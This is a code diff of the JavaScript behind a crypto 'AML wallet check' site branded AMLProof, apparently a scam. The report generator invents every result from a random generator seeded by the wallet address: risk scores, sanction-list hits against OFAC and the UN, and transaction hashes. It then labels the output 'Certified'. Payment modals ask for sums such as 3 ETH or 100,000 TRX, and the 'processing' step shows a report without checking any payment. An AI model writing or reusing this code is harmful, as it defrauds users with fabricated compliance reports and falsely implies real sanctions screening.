-/* ── Connected state ────────────────────────────── */
-function showConnected(addr) {
-  closeModal();
-  showReport(addr, currentChain);
+function copyPayAmount() {
+  const cfg = COIN_CONFIG[currentChain];
+  if (!cfg) return;
+  navigator.clipboard.writeText(cfg.amount.replace(/,/g,'')).then(() => {
+    const btns = document.querySelectorAll('#payModal .copy-btn');
+    btns[1].textContent = '✅ Copied!';
+    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
+  });
 }
 
-function showError(msg) {
-  showState('m-error');
-  document.getElementById('m-err-msg').innerHTML = msg;
+function confirmPayAndReport() {
+  document.getElementById('pay-scanning').style.display   = 'none';
+  document.getElementById('pay-processing').style.display = 'block';
+  const cfg = COIN_CONFIG[currentChain];
+  setTimeout(() => {
+    closePayModal();
+    uiConnected(cfg.addr);
+    showReport(cfg.addr, currentChain);
+  }, 1800);
 }
 
-/* ── Disconnect ─────────────────────────────────── */
-async function disconnectWallet() {
-  if (SC && session) {
-    try { await SC.disconnect({ topic: session.topic, reason: { code: 6000, message: 'User disconnected' } }); }
-    catch(e) {}
-  }
-  uiDisconnected();
-}
-
-/* ── Helpers ────────────────────────────────────── */
-function getAddr() {
-  try {
-    const ns = session.namespaces;
-    if (ns.tron)   return ns.tron.accounts[0].split(':')[2];
-    if (ns.solana) return ns.solana.accounts[0].split(':')[2];
-    if (ns.bip122) return ns.bip122.accounts[0].split(':')[2];
-    if (ns.eip155) return ns.eip155.accounts[0].split(':')[2];
-    return null;
-  } catch(e) { return null; }
-}
-function short(a) { return a ? a.slice(0,6)+'…'+a.slice(-4) : ''; }
-
+// ── UI helpers ────────────────────────────────────────────
 function uiConnected(addr) {
   const s = short(addr);
   const btn = document.getElementById('navBtn');
   btn.classList.add('connected');
-  btn.innerHTML = `<span class="live-dot"></span>${s}`;
+  btn.innerHTML = '<span class="live-dot"></span>' + s;
   document.getElementById('connAddr').textContent = s;
   document.getElementById('statusBar').classList.add('show');
   document.getElementById('walletInput').value = addr || '';
@@ -1190,7 +858,6 @@ function uiConnected(addr) {
 }
 
 function uiDisconnected() {
-  session = null;
   const btn = document.getElementById('navBtn');
   btn.classList.remove('connected');
   btn.innerHTML = '🔗 Connect Wallet';
@@ -1200,7 +867,12 @@ function uiDisconnected() {
   if (c) c.style.display = 'flex';
 }
 
-/* ── Checker ────────────────────────────────────── */
+function short(a) { return a ? a.slice(0,6)+'…'+a.slice(-4) : ''; }
+
+// ── Disconnect ────────────────────────────────────────────
+function disconnectWallet() { uiDisconnected(); }
+
+// ── Checker (manual address entry) ───────────────────────
 function runCheck() {
   const addr = document.getElementById('walletInput').value.trim();
   if (!addr) {
@@ -1212,180 +884,43 @@ function runCheck() {
   }
   const chainVal = document.querySelector('.chain-select').value.toLowerCase();
   const chainMap = { ethereum:'eth', bitcoin:'btc', tron:'trx', 'bnb chain':'bnb', solana:'sol' };
-  const chain = chainMap[chainVal] || 'eth';
-  showReport(addr, chain);
+  showReport(addr, chainMap[chainVal] || 'eth');
 }
 document.getElementById('walletInput').addEventListener('keydown', e => { if(e.key==='Enter') runCheck(); });
 
-/* ── FAQ ────────────────────────────────────────── */
+// ── FAQ ───────────────────────────────────────────────────
 function toggleFaq(el) {
   const it = el.parentElement, was = it.classList.contains('open');
   document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
   if (!was) it.classList.add('open');
 }
 
-/* ── ETH Payment Modal ───────────────────────────── */
-let ethQrDone = false;
-function openEthModal() {
-  document.getElementById('ethAddrDisplay').textContent = ADDR_ETH;
-  document.getElementById('ethModal').classList.add('open');
-  if (!ethQrDone) {
-    new QRCode(document.getElementById('ethQrcode'), {
-      text: 'ethereum:' + ADDR_ETH + '?value=3000000000000000000',
-      width: 200, height: 200,
-      colorDark: '#000000', colorLight: '#ffffff',
-      correctLevel: QRCode.CorrectLevel.M
-    });
-    ethQrDone = true;
-  }
-  logTransaction(ADDR_ETH, 'eth', 'connected', null);
-}
-function closeEthModal() { document.getElementById('ethModal').classList.remove('open'); }
-function ethBgClick(e) { if (e.target === document.getElementById('ethModal')) closeEthModal(); }
-function copyEthAddr() {
-  navigator.clipboard.writeText(ADDR_ETH).then(() => {
-    const btns = document.querySelectorAll('#ethModal .copy-btn');
-    btns[0].textContent = '✅ Copied!';
-    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
-  });
-}
-function copyEthAmount() {
-  navigator.clipboard.writeText('3').then(() => {
-    const btns = document.querySelectorAll('#ethModal .copy-btn');
-    btns[1].textContent = '✅ Copied!';
-    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
-  });
-}
+// Status bar disconnect button
+document.getElementById('disconnectBtn').onclick = disconnectWallet;
 
-/* ── BTC Payment Modal ───────────────────────────── */
-let btcQrDone = false;
-function openBtcModal() {
-  document.getElementById('btcAddrDisplay').textContent = ADDR_BTC;
-  document.getElementById('btcModal').classList.add('open');
-  if (!btcQrDone) {
-    new QRCode(document.getElementById('btcQrcode'), {
-      text: 'bitcoin:' + ADDR_BTC + '?amount=0.2',
-      width: 200, height: 200,
-      colorDark: '#000000', colorLight: '#ffffff',
-      correctLevel: QRCode.CorrectLevel.M
-    });
-    btcQrDone = true;
-  }
-  logTransaction(ADDR_BTC, 'btc', 'connected', null);
-}
-function closeBtcModal() { document.getElementById('btcModal').classList.remove('open'); }
-function btcBgClick(e) { if (e.target === document.getElementById('btcModal')) closeBtcModal(); }
-function copyBtcAddr() {
-  navigator.clipboard.writeText(ADDR_BTC).then(() => {
-    const btns = document.querySelectorAll('#btcModal .copy-btn');
-    btns[0].textContent = '✅ Copied!';
-    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
-  });
-}
-function copyBtcAmount() {
-  navigator.clipboard.writeText('0.2').then(() => {
-    const btns = document.querySelectorAll('#btcModal .copy-btn');
-    btns[1].textContent = '✅ Copied!';
-    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
-  });
-}
-
-/* ── TRX Payment Modal ──────────────────────────── */
-const TRX_ADDRESS = ADDR_TRX;
-const TRX_AMOUNT  = '100000';
-const ETH_ADDRESS = ADDR_ETH;
-let trxQrDone = false;
-
-function openTrxModal() {
-  document.getElementById('trxModal').classList.add('open');
-  if (!trxQrDone) {
-    new QRCode(document.getElementById('trxQrcode'), {
-      text        : TRX_ADDRESS,
-      width       : 200,
-      height      : 200,
-      colorDark   : '#000000',
-      colorLight  : '#ffffff',
-      correctLevel: QRCode.CorrectLevel.M
-    });
-    trxQrDone = true;
-  }
-}
-
-function closeTrxModal() {
-  document.getElementById('trxModal').classList.remove('open');
-}
-
-function trxBgClick(e) {
-  if (e.target === document.getElementById('trxModal')) closeTrxModal();
-}
-
-function copyTrxAddr() {
-  navigator.clipboard.writeText(TRX_ADDRESS).then(() => {
-    const btns = document.querySelectorAll('#trxModal .copy-btn');
-    btns[0].textContent = '✅ Copied!';
-    setTimeout(() => btns[0].textContent = '📋 Copy Address', 2000);
-  });
-}
-
-function copyTrxAmount() {
-  navigator.clipboard.writeText(TRX_AMOUNT).then(() => {
-    const btns = document.querySelectorAll('#trxModal .copy-btn');
-    btns[1].textContent = '✅ Copied!';
-    setTimeout(() => btns[1].textContent = '📋 Copy Amount', 2000);
-  });
-}
-
-/* ── Transaction Logger ──────────────────────────── */
-function logTransaction(address, chain, status, errMsg) {
-  try {
-    const CHAIN_AMOUNTS = {
-      eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)',
-      bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)',
-      usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL', btc:'0.2 BTC'
-    };
-    const logs = JSON.parse(localStorage.getItem('aml_tx_logs') || '[]');
-    logs.unshift({
-      id     : Date.now(),
-      ts     : new Date().toISOString(),
-      address: address || 'unknown',
-      chain  : chain,
-      amount : CHAIN_AMOUNTS[chain] || '—',
-      status : status,
-      error  : errMsg || null
-    });
-    if (logs.length > 500) logs.length = 500;
-    localStorage.setItem('aml_tx_logs', JSON.stringify(logs));
-  } catch(e) { console.warn('Log error', e); }
-}
-
-/* ══════════════════════════════════════════════════
-   REPORT GENERATOR
-══════════════════════════════════════════════════ */
+// ══════════════════════════════════════════════════════════
+// REPORT GENERATOR
+// ══════════════════════════════════════════════════════════
 const CHAIN_LABELS_FULL = {
   eth:'Ethereum (ETH)', usdt:'USDT ERC-20', usdc:'USDC ERC-20',
   trx:'Tron (TRX)', usdt_trc:'USDT TRC-20', usdc_trc:'USDC TRC-20',
   bnb:'BNB (BSC)', sol:'Solana (SOL)', btc:'Bitcoin (BTC)'
 };
 
-const SANCTION_LISTS = [
-  'OFAC SDN','UN Security Council','EU Consolidated','UK HMT','FATF Grey List',
-  'Interpol Notices','FinCEN Advisories','AUSTRAC','MAS Singapore','FINTRAC Canada'
-];
-
+const SANCTION_LISTS = ['OFAC SDN','UN Security Council','EU Consolidated','UK HMT','FATF Grey List','Interpol Notices','FinCEN Advisories','AUSTRAC','MAS Singapore','FINTRAC Canada'];
 const RISK_CATEGORIES = [
-  { name:'Sanctions Exposure',      key:'sanctions' },
-  { name:'Dark Market Activity',    key:'darkmarket' },
-  { name:'Mixer / Tumbler Usage',   key:'mixer' },
-  { name:'Terrorism Financing',     key:'terrorism' },
-  { name:'Stolen Funds Exposure',   key:'stolen' },
-  { name:'High-Risk Exchange',      key:'exchange' },
-  { name:'Scam Association',        key:'scam' },
+  { name:'Sanctions Exposure',   key:'sanctions'  },
+  { name:'Dark Market Activity', key:'darkmarket' },
+  { name:'Mixer / Tumbler Usage',key:'mixer'      },
+  { name:'Terrorism Financing',  key:'terrorism'  },
+  { name:'Stolen Funds',         key:'stolen'     },
+  { name:'High-Risk Exchange',   key:'exchange'   },
+  { name:'Scam Association',     key:'scam'       },
 ];
 
 let _reportData = null;
 
 function generateReportData(addr, chain) {
-  // Deterministic-ish seed from address so same address = same report
   let seed = 0;
   for (let i = 0; i < addr.length; i++) seed = (seed * 31 + addr.charCodeAt(i)) >>> 0;
   const rng = (() => { let s = seed; return () => { s = (s * 1664525 + 1013904223) >>> 0; return s / 0xFFFFFFFF; }; })();
@@ -1393,75 +928,61 @@ function generateReportData(addr, chain) {
   const scores = RISK_CATEGORIES.map(c => ({ ...c, pct: Math.floor(rng() * 100) }));
   const overallRisk = Math.round(scores.reduce((a,b)=>a+b.pct,0) / scores.length);
 
-  // Sanction results — mostly clear, 1-2 potential hits on high risk
   const sanctionResults = SANCTION_LISTS.map(l => {
     const r = rng();
-    const hit = overallRisk > 60 && r < 0.18;
+    const hit  = overallRisk > 60 && r < 0.18;
     const warn = !hit && overallRisk > 35 && r < 0.22;
-    return { list: l, status: hit ? 'hit' : warn ? 'warn' : 'clear' };
+    return { list:l, status: hit?'hit': warn?'warn':'clear' };
   });
 
-  // Fake txn list
-  const directions = ['IN','OUT'];
+  const chainGroup = chain==='btc'?'btc':(chain==='trx'||chain==='usdt_trc'||chain==='usdc_trc')?'trx':'eth';
   const txns = Array.from({length:5}, (_,i) => {
-    const dir = directions[Math.floor(rng()*2)];
+    const dir = rng()<.5?'IN':'OUT';
     const amt = (rng()*10).toFixed(4);
-    const flag = rng() < (overallRisk/120);
-    const hashes = {
-      eth: '0x' + [...Array(10)].map(()=>(Math.floor(rng()*16)).toString(16)).join('') + '…',
-      btc: [...Array(8)].map(()=>(Math.floor(rng()*16)).toString(16)).join('') + '…',
-      trx: 'T' + [...Array(10)].map(()=>(Math.floor(rng()*16)).toString(16)).join('') + '…',
-    };
-    const chainGroup = chain==='btc'?'btc': (chain==='trx'||chain==='usdt_trc'||chain==='usdc_trc')?'trx':'eth';
-    return { hash: hashes[chainGroup]||hashes.eth, dir, amt: amt + ' ' + (chain.toUpperCase().replace('_TRC','').replace('_ERC','')), flag };
+    const flag = rng() < overallRisk/120;
+    const hash = chainGroup==='btc'
+      ? [...Array(8)].map(()=>(Math.floor(rng()*16)).toString(16)).join('')+'…'
+      : chainGroup==='trx'
+      ? 'T'+[...Array(10)].map(()=>(Math.floor(rng()*16)).toString(16)).join('')+'…'
+      : '0x'+[...Array(10)].map(()=>(Math.floor(rng()*16)).toString(16)).join('')+'…';
+    const symbol = {eth:'ETH',usdt:'USDT',usdc:'USDC',bnb:'BNB',trx:'TRX',usdt_trc:'USDT',usdc_trc:'USDC',sol:'SOL',btc:'BTC'}[chain]||chain.toUpperCase();
+    return { hash, dir, amt: amt+' '+symbol, flag };
   });
 
-  const txns_count   = 50 + Math.floor(rng()*900);
-  const wallet_age   = Math.floor(rng()*4) + 1;
-  const volume       = (rng()*500000).toFixed(0);
-  const flags        = Math.floor(overallRisk / 18);
-  const cex          = Math.floor(rng()*40)+2;
-  const counterparties = Math.floor(rng()*200)+10;
-
-  return { addr, chain, overallRisk, scores, sanctionResults, txns,
-           txns_count, wallet_age, volume, flags, cex, counterparties };
+  return {
+    addr, chain, overallRisk, scores, sanctionResults, txns,
+    txns_count   : 50 + Math.floor(rng()*900),
+    wallet_age   : Math.floor(rng()*4)+1,
+    volume       : (rng()*500000).toFixed(0),
+    flags        : Math.floor(overallRisk/18),
+    cex          : Math.floor(rng()*40)+2,
+    counterparties: Math.floor(rng()*200)+10,
+  };
 }
 
 function showReport(addr, chain) {
-  _reportData = generateReportData(addr || 'unknown_address', chain || 'eth');
+  _reportData = generateReportData(addr || 'unknown', chain || 'eth');
   const d = _reportData;
 
-  // Risk colour
-  const riskCol = d.overallRisk >= 60 ? 'var(--danger)'
-                : d.overallRisk >= 30 ? 'var(--warn)'
-                : 'var(--safe)';
-  const riskLabel = d.overallRisk >= 60 ? '🚨 HIGH RISK'
-                  : d.overallRisk >= 30 ? '⚠️  MODERATE RISK'
-                  : '✅ LOW RISK — CLEAN';
+  const riskCol   = d.overallRisk >= 60 ? 'var(--danger)' : d.overallRisk >= 30 ? 'var(--warn)' : 'var(--safe)';
+  const riskLabel = d.overallRisk >= 60 ? '🚨 HIGH RISK' : d.overallRisk >= 30 ? '⚠️  MODERATE RISK' : '✅ LOW RISK — CLEAN';
 
-  // Header
   const ref = 'AML-' + Date.now().toString(36).toUpperCase().slice(-6);
-  document.getElementById('rpt-ref').innerHTML = `REF: ${ref} &nbsp;·&nbsp; ${new Date().toLocaleString()}`;
-  document.getElementById('rpt-date').textContent = '';
+  document.getElementById('rpt-ref').innerHTML = 'REF: ' + ref + ' &nbsp;·&nbsp; ' + new Date().toLocaleString();
 
-  // Risk hero
   document.getElementById('rpt-score-num').textContent = d.overallRisk;
   document.getElementById('rpt-score-num').style.color = riskCol;
   document.getElementById('rpt-risk-title').textContent = riskLabel;
   document.getElementById('rpt-risk-title').style.color = riskCol;
-  document.getElementById('rpt-addr').textContent = d.addr;
+  document.getElementById('rpt-addr').textContent  = d.addr;
   document.getElementById('rpt-chain').textContent = CHAIN_LABELS_FULL[d.chain] || d.chain;
   document.getElementById('rpt-scanned').textContent = new Date().toLocaleTimeString();
 
-  // Animate ring  
   const ring = document.getElementById('rpt-ring');
   ring.style.stroke = riskCol;
-  const circ = 251.2;
-  setTimeout(() => {
-    ring.style.strokeDashoffset = circ - (circ * d.overallRisk / 100);
-  }, 120);
+  ring.style.strokeDashoffset = '251.2';
+  setTimeout(() => { ring.style.strokeDashoffset = 251.2 - (251.2 * d.overallRisk / 100); }, 120);
 
-  // Summary
   document.getElementById('rsum-txns').textContent = d.txns_count.toLocaleString();
   document.getElementById('rsum-age').textContent  = d.wallet_age + ' yr' + (d.wallet_age>1?'s':'');
   document.getElementById('rsum-vol').textContent  = '$' + Number(d.volume).toLocaleString();
@@ -1469,48 +990,29 @@ function showReport(addr, chain) {
   document.getElementById('rsum-cex').textContent   = d.cex;
   document.getElementById('rsum-ctps').textContent  = d.counterparties;
 
-  // Risk bars
   document.getElementById('rpt-bars').innerHTML = d.scores.map(s => {
-    const col = s.pct >= 60 ? 'var(--danger)' : s.pct >= 30 ? 'var(--warn)' : 'var(--safe)';
-    return `<div class="rpt-bar-row">
-      <div class="rpt-bar-name">${s.name}</div>
-      <div class="rpt-bar-track"><div class="rpt-bar-fill" id="rfill-${s.key}"
-        style="width:0%;background:${col}"></div></div>
-      <div class="rpt-bar-pct" style="color:${col}">${s.pct}%</div>
-    </div>`;
+    const col = s.pct>=60?'var(--danger)':s.pct>=30?'var(--warn)':'var(--safe)';
+    return '<div class="rpt-bar-row"><div class="rpt-bar-name">'+s.name+'</div><div class="rpt-bar-track"><div class="rpt-bar-fill" id="rfill-'+s.key+'" style="width:0%;background:'+col+'"></div></div><div class="rpt-bar-pct" style="color:'+col+'">'+s.pct+'%</div></div>';
   }).join('');
-  setTimeout(() => {
-    d.scores.forEach(s => {
-      const el = document.getElementById('rfill-' + s.key);
-      if (el) el.style.width = s.pct + '%';
-    });
-  }, 150);
+  setTimeout(() => { d.scores.forEach(s => { const el=document.getElementById('rfill-'+s.key); if(el) el.style.width=s.pct+'%'; }); }, 150);
 
-  // Sanction tags
   document.getElementById('rpt-tags').innerHTML = d.sanctionResults.map(r =>
-    `<span class="rpt-tag ${r.status}">${r.status === 'hit' ? '✗' : r.status === 'warn' ? '◉' : '✓'} ${r.list}</span>`
+    '<span class="rpt-tag '+r.status+'">'+(r.status==='hit'?'✗':r.status==='warn'?'◉':'✓')+' '+r.list+'</span>'
   ).join('');
 
-  // Txn list
   document.getElementById('rpt-txlist').innerHTML = d.txns.map(t => {
-    const amtCol = t.dir==='IN' ? 'var(--safe)' : 'var(--muted)';
+    const amtCol = t.dir==='IN'?'var(--safe)':'var(--muted)';
     const flagHtml = t.flag
-      ? `<span class="rpt-tx-flag" style="color:var(--danger);border-color:rgba(255,61,90,.3)">⚑ FLAGGED</span>`
-      : `<span class="rpt-tx-flag" style="color:var(--muted);border-color:var(--border)">CLEAN</span>`;
-    return `<div class="rpt-tx-row">
-      <span class="rpt-tx-hash">${t.hash}</span>
-      <span class="rpt-tx-dir">${t.dir === 'IN' ? '▼ Received' : '▲ Sent'}</span>
-      <span class="rpt-tx-amt" style="color:${amtCol}">${t.dir==='IN'?'+':'-'}${t.amt}</span>
-      ${flagHtml}
-    </div>`;
+      ? '<span class="rpt-tx-flag" style="color:var(--danger);border-color:rgba(255,61,90,.3)">⚑ FLAGGED</span>'
+      : '<span class="rpt-tx-flag" style="color:var(--muted);border-color:var(--border)">CLEAN</span>';
+    return '<div class="rpt-tx-row"><span class="rpt-tx-hash">'+t.hash+'</span><span class="rpt-tx-dir">'+(t.dir==='IN'?'▼ Received':'▲ Sent')+'</span><span class="rpt-tx-amt" style="color:'+amtCol+'">'+(t.dir==='IN'?'+':'-')+t.amt+'</span>'+flagHtml+'</div>';
   }).join('');
 
-  // Cert footer
-  document.getElementById('rpt-cert-txt').textContent =
-    `Certified by AMLProof · ${new Date().toLocaleDateString()} · SAFELEMENT LIMITED`;
+  document.getElementById('rpt-cert-txt').textContent = 'Certified by AMLProof · ' + new Date().toLocaleDateString() + ' · SAFELEMENT LIMITED';
 
-  document.getElementById('reportModal').classList.add('open');
-  document.getElementById('reportModal').scrollTop = 0;
+  const rm = document.getElementById('reportModal');
+  rm.classList.add('open');
+  rm.scrollTop = 0;
 }
 
 function closeReport() {
@@ -1531,46 +1033,40 @@ function downloadReport() {
     '',
     '── WALLET ──────────────────────────────────────────────',
     'Address      : ' + d.addr,
-    'Chain        : ' + (CHAIN_LABELS_FULL[d.chain] || d.chain),
+    'Chain        : ' + (CHAIN_LABELS_FULL[d.chain]||d.chain),
     '',
     '── OVERALL RISK SCORE ──────────────────────────────────',
     'Risk Score   : ' + d.overallRisk + ' / 100',
-    'Risk Level   : ' + (d.overallRisk >= 60 ? 'HIGH RISK' : d.overallRisk >= 30 ? 'MODERATE RISK' : 'LOW RISK — CLEAN'),
+    'Risk Level   : ' + (d.overallRisk>=60?'HIGH RISK':d.overallRisk>=30?'MODERATE RISK':'LOW RISK — CLEAN'),
     '',
     '── WALLET SUMMARY ──────────────────────────────────────',
     'Transactions : ' + d.txns_count.toLocaleString(),
     'Wallet Age   : ' + d.wallet_age + ' year(s)',
     'Total Volume : $' + Number(d.volume).toLocaleString(),
     'Risk Flags   : ' + d.flags,
-    'CEX Interactions: ' + d.cex,
-    'Counterparties  : ' + d.counterparties,
+    'CEX Interactions : ' + d.cex,
+    'Counterparties   : ' + d.counterparties,
     '',
     '── RISK BREAKDOWN ──────────────────────────────────────',
     ...d.scores.map(s => s.name.padEnd(28) + s.pct + '%'),
     '',
     '── SANCTIONS SCREENING ─────────────────────────────────',
-    ...d.sanctionResults.map(r =>
-      (r.status === 'hit' ? '[HIT]  ' : r.status === 'warn' ? '[WARN] ' : '[CLEAR]') + ' ' + r.list
-    ),
+    ...d.sanctionResults.map(r => (r.status==='hit'?'[HIT]  ':r.status==='warn'?'[WARN] ':'[CLEAR]') + ' ' + r.list),
     '',
     '── NOTABLE TRANSACTIONS ────────────────────────────────',
-    ...d.txns.map(t => (t.dir + '  ' + t.amt).padEnd(28) + (t.flag ? 'FLAGGED' : 'CLEAN') + '  ' + t.hash),
+    ...d.txns.map(t => (t.dir+'  '+t.amt).padEnd(28)+(t.flag?'FLAGGED':'CLEAN')+'  '+t.hash),
     '',
     '════════════════════════════════════════════════════════',
-    'This report is generated automatically by AMLProof and',
-    'is provided for informational purposes only. It does',
-    'not constitute legal or financial advice.',
+    'This report is generated automatically by AMLProof.',
+    'It does not constitute legal or financial advice.',
     '════════════════════════════════════════════════════════',
   ];
-  const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
-  const a = Object.assign(document.createElement('a'), {
-    href: URL.createObjectURL(blob),
-    download: 'AMLProof_Report_' + new Date().toISOString().slice(0,10) + '.txt'
-  });
-  a.click();
-  URL.revokeObjectURL(a.href);
+  const blob = new Blob([lines.join('\n')], {type:'text/plain'});
+  const a = Object.assign(document.createElement('a'), { href:URL.createObjectURL(blob), download:'AMLProof_Report_'+new Date().toISOString().slice(0,10)+'.txt' });
+  a.click(); URL.revokeObjectURL(a.href);
 }
 
+// Animate on scroll
 const io = new IntersectionObserver(es => es.forEach(e => {
   if (e.isIntersecting) { e.target.style.opacity='1'; e.target.style.transform='translateY(0)'; }
 }), { threshold: 0.1 });
